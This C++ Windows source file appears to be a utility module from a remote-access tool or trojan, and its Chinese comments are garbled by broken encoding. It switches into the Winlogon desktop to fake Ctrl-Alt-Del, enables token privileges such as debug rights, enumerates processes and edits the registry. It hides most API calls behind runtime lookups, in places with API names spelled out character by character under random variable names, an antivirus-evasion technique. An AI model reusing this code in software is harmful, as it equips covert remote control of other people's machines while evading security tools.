#if !defined(AFX_UNTIL_CPP_INCLUDED)
#define AFX_UNTIL_CPP_INCLUDED
#include <windows.h>
#include <process.h>
#include <tlhelp32.h>
#include "until.h"



unsigned int __stdcall ThreadLoader(LPVOID param)
{
    unsigned int	nRet = 0;
#if _DLL
    try {
#endif
        THREAD_ARGLIST	arg;
        memcpy(&arg, param, sizeof(arg));
        SetEvent(arg.hEventTransferArg);
        // ��׿�潻��
        if (arg.bInteractive)
            SelectDesktop(NULL);
        nRet = arg.start_address(arg.arglist);
#if _DLL
    } catch(...) {};
#endif
    return nRet;
}

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
                       SIZE_T dwStackSize,                       // initial stack size
                       LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
                       LPVOID lpParameter,                       // thread argument
                       DWORD dwCreationFlags,                    // creation option
                       LPDWORD lpThreadId,
                       bool bInteractive)

{
    HANDLE	hThread = INVALID_HANDLE_VALUE;
    THREAD_ARGLIST	arg;
    arg.start_address = (unsigned ( __stdcall *)( void * ))lpStartAddress;
    arg.arglist = (void *)lpParameter;
    arg.hEventTransferArg = CreateEvent(NULL, false, false, NULL);
    hThread = (HANDLE)_beginthreadex((void *)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, (unsigned *)lpThreadId);
    WaitForSingleObject(arg.hEventTransferArg, INFINITE);
    CloseHandle(arg.hEventTransferArg);

    return hThread;
}


BOOL SimulateCtrlAltDel()
{
    //////////////////////////////////////////////////////////////////////////
    HINSTANCE user32 = LoadLibrary("user32.dll");

    typedef HDESK(WINAPI* TGetThreadDesktop)(DWORD);
    typedef BOOL(WINAPI* TPostMessageA)(HWND, UINT, WPARAM, LPARAM);

    TGetThreadDesktop MyGetThreadDesktop = (TGetThreadDesktop)GetProcAddress(user32, "GetThreadDesktop");
    TPostMessageA MyPostMessage = (TPostMessageA)GetProcAddress(user32, "PostMessageA");
    //////////////////////////////////////////////////////////////////////////
    BOOL   iResult = TRUE;
    __try {

        HDESK old_desktop = MyGetThreadDesktop(GetCurrentThreadId());

        // Switch into the Winlogon desktop
        if (!SelectDesktop("Winlogon")) {
            iResult = FALSE;
            __leave;
        }

        // Fake a hotkey event to any windows we find there.... :(
        // Winlogon uses hotkeys to trap Ctrl-Alt-Del...
        MyPostMessage(HWND_BROADCAST, WM_HOTKEY, 0, MAKELONG(MOD_ALT | MOD_CONTROL, VK_DELETE));

        // Switch back to our original desktop
        if (old_desktop != NULL)
            SelectHDESK(old_desktop);
    } __finally {
        if (user32)
            FreeLibrary(user32);
    }


    return iResult;
}

BOOL SelectHDESK(HDESK new_desktop)
{
    //////////////////////////////////////////////////////////////////////////
    HINSTANCE user32 = LoadLibrary("user32.dll");

    typedef HDESK (WINAPI *TGetThreadDesktop)(DWORD);
    typedef BOOL (WINAPI *TGetUserObjectInformationA)(HANDLE,int,PVOID,DWORD,LPDWORD);
    typedef BOOL (WINAPI *TSetThreadDesktop)(HDESK);
    typedef BOOL (WINAPI *TCloseDesktop)(HDESK);

    TGetThreadDesktop MyGetThreadDesktop= (TGetThreadDesktop)GetProcAddress(user32, "GetThreadDesktop");
    TGetUserObjectInformationA MyGetUserObjectInformation= (TGetUserObjectInformationA)GetProcAddress(user32, "GetUserObjectInformationA");
    TSetThreadDesktop MySetThreadDesktop= (TSetThreadDesktop)GetProcAddress(user32, "SetThreadDesktop");
    TCloseDesktop MyCloseDesktop= (TCloseDesktop)GetProcAddress(user32, "CloseDesktop");


    HINSTANCE kernel32 = LoadLibrary("kernel32.dll");
    typedef DWORD (WINAPI *TGetCurrentThreadId)(VOID);
    TGetCurrentThreadId MyGetCurrentThreadId= (TGetCurrentThreadId)GetProcAddress(kernel32, "GetCurrentThreadId");

    //////////////////////////////////////////////////////////////////////////

    HDESK old_desktop = MyGetThreadDesktop(MyGetCurrentThreadId());

    DWORD dummy;
    char new_name[256];

    BOOL   iResult = TRUE;
    __try {

        if (!MyGetUserObjectInformation(new_desktop, UOI_NAME, &new_name, 256, &dummy)) {
            iResult = FALSE;
            __leave;
        }

        // Switch the desktop
        if(!MySetThreadDesktop(new_desktop)) {
            iResult = FALSE;
            __leave;
        }

        // Switched successfully - destroy the old desktop
        MyCloseDesktop(old_desktop);

    } __finally {
        if(user32)
            FreeLibrary(user32);

        if (kernel32)
            FreeLibrary(kernel32);
    }

    return iResult;
}

BOOL SelectDesktop(const TCHAR *name)
{
    //////////////////////////////////////////////////////////////////////////
    HINSTANCE user32 = LoadLibrary("user32.dll");

    typedef HDESK (WINAPI *TOpenDesktopA)(LPCSTR,DWORD,BOOL,ACCESS_MASK);
    typedef HDESK (WINAPI *TOpenInputDesktop)(DWORD,BOOL,ACCESS_MASK);
    typedef BOOL (WINAPI *TCloseDesktop)(HDESK);

    TOpenInputDesktop MyOpenInputDesktop= (TOpenInputDesktop)GetProcAddress(user32, "OpenInputDesktop");
    TOpenDesktopA MyOpenDesktop= (TOpenDesktopA)GetProcAddress(user32, "OpenDesktopA");
    TCloseDesktop MyCloseDesktop= (TCloseDesktop)GetProcAddress(user32, "CloseDesktop");
    //////////////////////////////////////////////////////////////////////////
    HDESK desktop;

    BOOL   iResult = TRUE;
    __try {

        if (name != NULL) {
            // Attempt to open the named desktop
            desktop = MyOpenDesktop(name, 0, FALSE,0x1FF);
        } else {
            // No, so open the input desktop
            desktop = MyOpenInputDesktop(0, FALSE,0x1FF);
        }

        // Did we succeed?
        if (desktop == NULL) {
            iResult = FALSE;
            __leave;
        }

        // Switch to the new desktop
        if (!SelectHDESK(desktop)) {
            // Failed to enter the new desktop, so free it!
            MyCloseDesktop(desktop);
            iResult =  FALSE;
            __leave;
        }
    } __finally {
        if(user32)
            FreeLibrary(user32);
    }

    return iResult;
}



BOOL DebugPrivilege(const char *PName,BOOL bEnable)
{
    bool              bResult = TRUE;
    HANDLE            hToken;
    TOKEN_PRIVILEGES  TokenPrivileges;


    HINSTANCE advapi32 = LoadLibrary("ADVAPI32.dll");

    typedef BOOL (WINAPI *OPT)(HANDLE ProcessHandle,DWORD DesiredAccess,PHANDLE TokenHandle);
    OPT myopt;
    myopt= (OPT)GetProcAddress(advapi32, "OpenProcessToken");

    typedef BOOL (WINAPI *ATP)(HANDLE TokenHandle,BOOL DisableAllPrivileges,PTOKEN_PRIVILEGES NewState,DWORD BufferLength,PTOKEN_PRIVILEGES PreviousState,PDWORD ReturnLength);
    ATP myapt;
    myapt= (ATP)GetProcAddress(advapi32, "AdjustTokenPrivileges");

    typedef BOOL (WINAPI *LPV)(LPCTSTR lpSystemName, LPCTSTR lpName,PLUID lpLuid);
    LPV mylpv;
#ifdef UNICODE
    mylpv= (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueW");
#else
    mylpv= (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueA");
#endif

    HINSTANCE kernel32 = LoadLibrary("kernel32.dll");
    typedef HANDLE (WINAPI *TGetCurrentProcess)(VOID);
    TGetCurrentProcess myGetCurrentProcess = (TGetCurrentProcess)GetProcAddress(kernel32, "GetCurrentProcess");


    if (!myopt(myGetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        bResult = FALSE;
        return bResult;
    }
    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;


    mylpv(NULL, PName, &TokenPrivileges.Privileges[0].Luid);

    myapt(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

    typedef int (WINAPI *GLE)(void);
    GLE myGetLastError;
    HINSTANCE hdlxxe = LoadLibrary("KERNEL32.dll");
    myGetLastError= (GLE)GetProcAddress(hdlxxe, "GetLastError");

    if (myGetLastError() != ERROR_SUCCESS) {
        bResult = FALSE;
    }

    CloseHandle(hToken);
    if(advapi32)
        FreeLibrary(advapi32);
    if(kernel32)
        FreeLibrary(kernel32);
    return bResult;
}

#include <STDIO.H>
int WriteToLog(char* str)
{
    FILE* log;
    log=fopen("C:\\2.txt","a+");
    if (log==NULL)
        return -1;
    fprintf(log,"%s\n",str);
    fclose(log);
    return 0;
}


BOOL EnumProcesin(LPTSTR lpProcessName)
{
    typedef BOOL (WINAPI *TProcess32First)(HANDLE,LPPROCESSENTRY32);
    typedef BOOL (WINAPI *TProcess32Next)(HANDLE,LPPROCESSENTRY32);

    typedef HANDLE (WINAPI *TCreateToolhelp32Snapshot)(DWORD,DWORD);
    HINSTANCE kernel32 = LoadLibrary("kernel32.dll");
    TCreateToolhelp32Snapshot myCreateToolhelp32Snapshot = (TCreateToolhelp32Snapshot)GetProcAddress(kernel32, "CreateToolhelp32Snapshot");
    TProcess32First myProcess32First = (TProcess32First)GetProcAddress(kernel32, "Process32First");
    TProcess32Next myProcess32Next = (TProcess32Next)GetProcAddress(kernel32, "Process32Next");

    BOOL bFound = FALSE;
    PROCESSENTRY32 pe;
    DWORD dwRet;
    HANDLE hSP = myCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSP) {
        pe.dwSize = sizeof( pe );

        for (dwRet = myProcess32First(hSP, &pe); dwRet; dwRet = myProcess32Next(hSP, &pe)) {
            if (lstrcmpi( lpProcessName, pe.szExeFile) == 0) {
                bFound = TRUE;
                break;
            }
        }

    }
    CloseHandle(hSP);
    if(kernel32)
        FreeLibrary(kernel32);
    return bFound;
}

BOOL CheckFileExist(LPCTSTR lpszPath)
{
    if ( GetFileAttributes(lpszPath) == 0xFFFFFFFF && GetLastError() == ERROR_FILE_NOT_FOUND ) {
        return FALSE;
    } else {
        return TRUE;
    }
}

DWORD GetProcessID(LPCTSTR lpProcessName)
{
    DWORD RetProcessID = 0;



    typedef HANDLE
    (WINAPI
     *CreateToolhelp32SnapshotT)(
         DWORD dwFlags,
         DWORD th32ProcessID
     );
    char JgKxihB[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
    char QrUQkBu[] = {'C','r','e','a','t','e','T','o','o','l','h','e','l','p','3','2','S','n','a','p','s','h','o','t','\0'};
    CreateToolhelp32SnapshotT pCreateToolhelp32Snapshot=(CreateToolhelp32SnapshotT)GetProcAddress(LoadLibrary(JgKxihB),QrUQkBu);
    HANDLE handle=pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);


    PROCESSENTRY32* info=new PROCESSENTRY32;


    info->dwSize=sizeof(PROCESSENTRY32);




    if(Process32First(handle,info)) {




        if (_stricmp(info->szExeFile,lpProcessName) == 0) {


            RetProcessID = info->th32ProcessID;

            delete info;

            return RetProcessID;
        }


        while(Process32Next(handle,info) != FALSE) {


            if (lstrcmpi(info->szExeFile,lpProcessName) == 0) {


                RetProcessID = info->th32ProcessID;
                delete info;


                return RetProcessID;
            }


        }

    }


    CloseHandle(handle);//���޸�

    delete info;


    return RetProcessID;
}

char *  my_strncat(char *dest,const char *source,int count)
{
    char *p = dest;
    while (*p) p++;
    while (count-- && (*p++ = *source++));
    *p = (char)'/0';
    return(dest);
}
char * my_strchr(const char *str, int ch)
{
    while (*str && *str != (char)ch)
        str++;
    if (*str == (char)ch)
        return((char *)str);
    return(NULL);
}
//��ȡע����ָ����������(Mode:0-����ֵ���� 1-�����Ӽ�)
int  ReadRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char *szData,LPBYTE szBytes,DWORD lbSize,int Mode)
{
    HKEY   hKey=NULL;
    int    ValueDWORD,iResult=0;
    char*  PointStr;
    char   KeyName[32],ValueSz[MAX_PATH],ValueTemp[MAX_PATH];
    DWORD  szSize,dwIndex=0;

    memset(KeyName,0,sizeof(KeyName));
    memset(ValueSz,0,sizeof(ValueSz));
    memset(ValueTemp,0,sizeof(ValueTemp));

//////////////////////////////////////////////////////////////////////////
    HINSTANCE advapi32 = LoadLibrary("ADVAPI32.dll");

    typedef BOOL (WINAPI *TRegQueryValueExA)(HKEY,LPCTSTR,LPDWORD,LPDWORD,LPBYTE,LPDWORD );
    typedef int (WINAPI *TRegOpenKeyExA)(HKEY,LPCTSTR,DWORD,REGSAM,PHKEY );
    typedef BOOL (WINAPI *TRegEnumValueA)(HKEY,DWORD,LPTSTR,LPDWORD,LPDWORD,LPDWORD,LPBYTE,LPDWORD );
    typedef BOOL (WINAPI *TRegEnumKeyExA)(HKEY,DWORD,LPTSTR,LPDWORD,LPDWORD,LPTSTR,LPDWORD,PFILETIME );
    typedef BOOL (WINAPI *TRegCloseKey)(HKEY );



    TRegQueryValueExA MyRegQueryValueEx = (TRegQueryValueExA)GetProcAddress(advapi32, "RegQueryValueExA");
    TRegOpenKeyExA MyRegOpenKeyEx = (TRegOpenKeyExA)GetProcAddress(advapi32, "RegOpenKeyExA");
    TRegEnumValueA MyRegEnumValue= (TRegEnumValueA)GetProcAddress(advapi32, "RegEnumValueA");
    TRegEnumKeyExA MyRegEnumKeyEx= (TRegEnumKeyExA)GetProcAddress(advapi32, "RegEnumKeyExA");
    TRegCloseKey MyRegCloseKey= (TRegCloseKey)GetProcAddress(advapi32, "RegCloseKey");
//////////////////////////////////////////////////////////////////////////


    __try {
        if(MyRegOpenKeyEx(MainKey,SubKey,0,KEY_READ,&hKey) != ERROR_SUCCESS) {
            iResult = -1;
            __leave;
        }
        switch(Mode) {
        case 0:
            switch(Type) {
            case REG_SZ:
            case REG_EXPAND_SZ:
                szSize = sizeof(ValueSz);
                if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,(LPBYTE)ValueSz,&szSize) == ERROR_SUCCESS) {
                    lstrcpy(szData,ValueSz);
                    iResult =1;
                }
                break;
            case REG_MULTI_SZ:
                szSize = sizeof(ValueSz);
                if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,(LPBYTE)ValueSz,&szSize) == ERROR_SUCCESS) {
                    for(PointStr = ValueSz; *PointStr; PointStr = my_strchr(PointStr,0)+1) { //strchr
                        my_strncat(ValueTemp,PointStr,sizeof(ValueTemp));
                        my_strncat(ValueTemp," ",sizeof(ValueTemp));
                    }
                    lstrcpy(szData,ValueTemp);
                    iResult =1;
                }
                break;
            case REG_DWORD:
                szSize = sizeof(DWORD);

                if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,(LPBYTE)&ValueDWORD,&szSize ) == ERROR_SUCCESS) {
                    wsprintf(szData,"%d",ValueDWORD);
                    iResult =1;
                }
                break;
            case REG_BINARY:
                szSize = lbSize;

                if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,szBytes,&szSize) == ERROR_SUCCESS) {
                    wsprintf(szData,"%08X",Type);
                    iResult =1;
                }
                break;
            }
            break;
        default:
            break;
        }
    } __finally {

        MyRegCloseKey(MainKey);
        MyRegCloseKey(hKey);
    }
    if(advapi32)
        FreeLibrary(advapi32);

    return iResult;
}
char * my_strncpy( char * dest, const char * source, int count )
{
    char *p = dest;
    while (count && (*p++ = *source++)) count--;
    while(count--)
        *p++ = '\0';
    return(dest);
}

//дע����ָ����������(Mode:0-�½������� 1-���ü����� 2-ɾ��ָ���� 3-ɾ��ָ������)
int WriteRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,const char* szData,DWORD dwData,int Mode)
{
    HKEY  hKey=NULL;
    DWORD dwDisposition;
    int   iResult =0;
//////////////////////////////////////////////////////////////////////////
    HINSTANCE advapi32 = LoadLibrary("ADVAPI32.dll");

    typedef LONG (WINAPI *TRegCreateKeyExA)(HKEY,LPCSTR,DWORD,LPSTR,DWORD,REGSAM,LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD );
    typedef LONG (WINAPI *TRegSetValueExA)(HKEY,LPCSTR,DWORD,DWORD,CONST BYTE *,DWORD );
    typedef LONG (WINAPI *TRegDeleteKeyA)(HKEY,LPCSTR );
    typedef LONG (WINAPI *TRegDeleteValueA)(HKEY,LPCSTR );
    typedef LONG (WINAPI *TRegOpenKeyExA)(HKEY,LPCSTR,DWORD,REGSAM,PHKEY );
    typedef LONG (WINAPI *TRegCloseKey)(HKEY );

    TRegCreateKeyExA MyRegCreateKeyEx= (TRegCreateKeyExA)GetProcAddress(advapi32, "RegCreateKeyExA");
    TRegSetValueExA MyRegSetValueEx = (TRegSetValueExA)GetProcAddress(advapi32, "RegSetValueExA");
    TRegDeleteKeyA MyRegDeleteKey = (TRegDeleteKeyA)GetProcAddress(advapi32, "RegDeleteKeyA");
    TRegDeleteValueA MyRegDeleteValue= (TRegDeleteValueA)GetProcAddress(advapi32, "RegDeleteValueA");
    TRegOpenKeyExA MyRegOpenKeyEx = (TRegOpenKeyExA)GetProcAddress(advapi32, "RegOpenKeyExA");
    TRegCloseKey MyRegCloseKey= (TRegCloseKey)GetProcAddress(advapi32, "RegCloseKey");
//////////////////////////////////////////////////////////////////////////


    __try {
        //	SetKeySecurityEx(MainKey,Subkey,KEY_ALL_ACCESS);
        switch(Mode) {
        case 0:
            if(MyRegCreateKeyEx(MainKey,SubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,&dwDisposition) != ERROR_SUCCESS)
                __leave;
        case 1:
            if(MyRegOpenKeyEx(MainKey,SubKey,0,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)
                __leave;
            switch(Type) {
            case REG_SZ:
            case REG_EXPAND_SZ:
            case REG_MULTI_SZ:
                if(MyRegSetValueEx(hKey,Vname,0,Type,(LPBYTE)szData,lstrlen(szData)+1) == ERROR_SUCCESS)
                    iResult =1;
                break;
            case REG_DWORD:
                if(MyRegSetValueEx(hKey,Vname,0,Type,(LPBYTE)&dwData,sizeof(DWORD)) == ERROR_SUCCESS)
                    iResult =1;
                break;
            case REG_BINARY:
                break;
            }
            break;
        case 2:
            if(MyRegOpenKeyEx(MainKey,SubKey,NULL,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)
                __leave;
            if (MyRegDeleteKey(hKey,Vname) == ERROR_SUCCESS)
                iResult =1;
            break;
        case 3:
            if(MyRegOpenKeyEx(MainKey,SubKey,NULL,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)
                __leave;
            if (MyRegDeleteValue(hKey,Vname) == ERROR_SUCCESS)
                iResult =1;
            break;
        default:
            __leave;

        }
    } __finally {
        MyRegCloseKey(MainKey);
        MyRegCloseKey(hKey);
    }
    if(advapi32)
        FreeLibrary(advapi32);
    return iResult;
}

#endif // !defined(AFX_UNTIL_CPP_INCLUDED)